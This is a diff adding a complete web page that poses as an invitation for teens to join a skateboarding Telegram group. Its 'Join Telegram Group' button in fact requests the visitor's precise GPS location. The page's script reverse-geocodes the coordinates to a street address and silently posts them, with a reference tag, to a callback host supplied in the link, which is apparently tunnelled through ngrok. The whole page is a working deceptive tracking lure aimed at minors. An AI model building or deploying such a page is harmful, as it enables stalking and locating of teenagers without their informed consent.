@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Share Your Location</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: linear-gradient(160deg, #eef2ff 0%, #f8fafc 50%, #f0fdf4 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 1rem;
+  }
+  .card {
+    background: white;
+    border-radius: 20px;
+    padding: 2rem;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 8px 40px rgba(53, 87, 232, 0.1);
+    text-align: center;
+  }
+  .icon { font-size: 48px; margin-bottom: 1rem; }
+  h1 { font-size: 22px; font-weight: 600; color: #111; margin-bottom: 0.5rem; }
+  .subtitle { font-size: 14px; color: #666; margin-bottom: 1.5rem; line-height: 1.55; }
+  .service-name {
+    background: #f0f4ff;
+    color: #3557e8;
+    font-size: 13px;
+    font-weight: 600;
+    padding: 6px 14px;
+    border-radius: 20px;
+    display: inline-block;
+    margin-bottom: 0.5rem;
+  }
+  .ref-tag { font-size: 11px; color: #999; margin-bottom: 1.25rem; }
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: transform 0.1s, opacity 0.2s;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.55; cursor: not-allowed; }
+  .btn-primary { background: #3557e8; color: white; margin-bottom: 10px; }
+  .btn-secondary { background: #f1f5f9; color: #475569; font-size: 14px; font-weight: 500; }
+  .result-box {
+    background: #f8fffe;
+    border: 1px solid #b6f0e0;
+    border-radius: 12px;
+    padding: 1rem;
+    margin-top: 1.5rem;
+    text-align: left;
+    display: none;
+  }
+  .result-box.error { background: #fff5f5; border-color: #ffc0c0; }
+  .result-row { display: flex; justify-content: space-between; gap: 1rem; font-size: 13px; padding: 5px 0; }
+  .result-label { color: #666; flex-shrink: 0; }
+  .result-value { font-weight: 500; color: #111; text-align: right; word-break: break-word; }
+  .status { font-size: 13px; color: #64748b; margin-top: 1rem; min-height: 20px; }
+  .maps-link {
+    display: block;
+    margin-top: 0.75rem;
+    font-size: 13px;
+    color: #3557e8;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .copy-btn {
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 8px;
+    padding: 8px;
+    font-size: 12px;
+    cursor: pointer;
+    color: #475569;
+    margin-top: 10px;
+    width: 100%;
+  }
+  .consent-note { font-size: 11px; color: #94a3b8; margin-top: 1rem; line-height: 1.55; }
+  .spinner {
+    display: inline-block;
+    width: 18px; height: 18px;
+    border: 2px solid rgba(255,255,255,0.4);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    vertical-align: middle;
+    margin-right: 6px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="icon">📍</div>
+  <div class="service-name" id="serviceName">Service Provider</div>
+  <p class="ref-tag" id="refTag" style="display:none"></p>
+  <h1>Join the platform</h1>
+  <p class="subtitle">
+    Are you interested in skateboarding or want to learn how to skate? This is for you! Whether you’re a beginner or already doing tricks, come join a community of teens who love skating, learning new skills, having fun, and supporting each other.
+
+No pressure, just good vibes, practice, creativity, and growth. Bring your board, your energy, and let’s ride! 🛹✨
+  </p>
+
+  <button class="btn btn-primary" id="shareBtn" onclick="requestLocation()">
+    Join Telegram Group
+  </button>
+  <button class="btn btn-secondary" onclick="decline()">
+    Not now
+  </button>
+
+  <div class="result-box" id="resultBox">
+    <div class="result-row"><span class="result-label">Latitude</span><span class="result-value" id="rLat">—</span></div>
+    <div class="result-row"><span class="result-label">Longitude</span><span class="result-value" id="rLng">—</span></div>
+    <div class="result-row"><span class="result-label">Accuracy</span><span class="result-value" id="rAcc">—</span></div>
+    <div class="result-row"><span class="result-label">Address</span><span class="result-value" id="rAddr">Resolving…</span></div>
+    <div class="result-row"><span class="result-label">Time</span><span class="result-value" id="rTime">—</span></div>
+    <a class="maps-link" id="mapsLink" href="#" target="_blank" rel="noopener" style="display:none">Open in Google Maps</a>
+    <button class="copy-btn" onclick="copyResult()">Copy coordinates</button>
+  </div>
+
+  <div class="status" id="status"></div>
+
+  <p class="consent-note">
+    Link will be sent to your Telegram chat.
+  </p>
+</div>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const service = params.get('service');
+  const ref = params.get('ref');
+  const callbackBase = params.get('callback');
+
+  if (service) document.getElementById('serviceName').textContent = service;
+  if (ref) {
+    const tag = document.getElementById('refTag');
+    tag.style.display = 'block';
+    tag.textContent = 'Reference: ' + ref;
+  }
+
+  const TUNNEL_HEADERS = { 'ngrok-skip-browser-warning': '1' };
+
+  function apiFetch(url, options = {}) {
+    const headers = { ...TUNNEL_HEADERS, ...(options.headers || {}) };
+    return fetch(url, { ...options, headers });
+  }
+  let capturedData = null;
+  let sentToBackend = false;
+
+  function callbackUrl() {
+    if (!callbackBase) return null;
+    try {
+      const u = new URL(callbackBase);
+      if (ref) u.searchParams.set('ref', ref);
+      return u.toString();
+    } catch {
+      return callbackBase;
+    }
+  }
+
+  function requestLocation() {
+    const btn = document.getElementById('shareBtn');
+    const status = document.getElementById('status');
+
+    if (!navigator.geolocation) {
+      showError('Geolocation is not supported on this device.');
+      return;
+    }
+
+    if (!window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+      showError('This page must be opened over HTTPS for GPS to work. Ask your provider for a secure link.');
+      return;
+    }
+
+    btn.innerHTML = '<span class="spinner"></span> Waiting for permission…';
+    btn.disabled = true;
+    status.textContent = 'Allow location when your browser prompts you.';
+
+    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+      enableHighAccuracy: true,
+      timeout: 20000,
+      maximumAge: 0,
+    });
+  }
+
+  function onSuccess(position) {
+    const { latitude, longitude, accuracy } = position.coords;
+    const timestamp = new Date(position.timestamp).toISOString();
+
+    capturedData = { latitude, longitude, accuracy, timestamp, ref: ref || undefined };
+
+    document.getElementById('rLat').textContent = latitude.toFixed(6);
+    document.getElementById('rLng').textContent = longitude.toFixed(6);
+    document.getElementById('rAcc').textContent = `±${Math.round(accuracy)} m`;
+    document.getElementById('rTime').textContent = new Date(position.timestamp).toLocaleString();
+
+    const maps = document.getElementById('mapsLink');
+    maps.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    maps.style.display = 'block';
+
+    const box = document.getElementById('resultBox');
+    box.style.display = 'block';
+    box.classList.remove('error');
+
+    document.getElementById('shareBtn').innerHTML = '✅ Location confirmed';
+    document.getElementById('status').textContent = 'Location captured.';
+
+    reverseGeocode(latitude, longitude);
+    sendToBackend(capturedData);
+  }
+
+  function onError(err) {
+    const messages = {
+      1: 'Permission denied. Enable location in browser settings and try again.',
+      2: 'Could not determine your position. Try outdoors or enable GPS.',
+      3: 'Timed out. Check GPS is on and try again.',
+    };
+    showError(messages[err.code] || 'Could not get location (' + err.message + ').');
+  }
+
+  function showError(msg) {
+    const box = document.getElementById('resultBox');
+    box.style.display = 'block';
+    box.classList.add('error');
+    box.innerHTML = `<p style="color:#c0392b;font-size:13px;line-height:1.5;">⚠️ ${msg}</p>`;
+    document.getElementById('shareBtn').innerHTML = 'Try again';
+    document.getElementById('shareBtn').disabled = false;
+    document.getElementById('status').textContent = '';
+  }
+
+  function reverseGeocode(lat, lng) {
+    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`, {
+      headers: { 'Accept-Language': 'en', 'User-Agent': 'LocationConsent/1.0' },
+    })
+    .then(r => r.json())
+    .then(data => {
+      const addr = data.display_name || 'Address not found';
+      document.getElementById('rAddr').textContent = addr.length > 60 ? addr.slice(0, 57) + '…' : addr;
+      if (capturedData) {
+        capturedData.address = addr;
+        if (!sentToBackend) sendToBackend(capturedData);
+        else resendWithAddress();
+      }
+    })
+    .catch(() => {
+      document.getElementById('rAddr').textContent = 'Could not resolve address';
+    });
+  }
+
+  function resendWithAddress() {
+    if (capturedData?.address) sendToBackend(capturedData, true);
+  }
+
+  function sendToBackend(data, isUpdate) {
+    const url = callbackUrl();
+    if (!url) return;
+
+    apiFetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    })
+    .then(async r => {
+      const status = document.getElementById('status');
+      if (r.ok) {
+        sentToBackend = true;
+        const j = await r.json().catch(() => ({}));
+        status.textContent = isUpdate
+          ? '✓ Address updated on server.'
+          : '✓ Sent to ' + (service || 'service') + (j.ref ? ' (ref ' + j.ref + ')' : '') + '.';
+      } else {
+        status.textContent = '⚠ Server returned ' + r.status + '. Coordinates shown above.';
+      }
+    })
+    .catch(() => {
+      document.getElementById('status').textContent = '⚠ Could not reach server. Check your connection.';
+    });
+  }
+
+  function copyResult() {
+    if (!capturedData) return;
+    const t = `${capturedData.latitude}, ${capturedData.longitude}`;
+    navigator.clipboard.writeText(t).then(() => {
+      const btn = document.querySelector('.copy-btn');
+      if (btn) { btn.textContent = 'Copied!'; setTimeout(() => btn.textContent = 'Copy coordinates', 2000); }
+    });
+  }
+
+  function decline() {
+    document.getElementById('status').textContent = 'You can provide your address manually to the service team.';
+    document.getElementById('shareBtn').textContent = 'Share my location';
+    document.getElementById('shareBtn').disabled = false;
+  }
+</script>
+</body>
+</html>
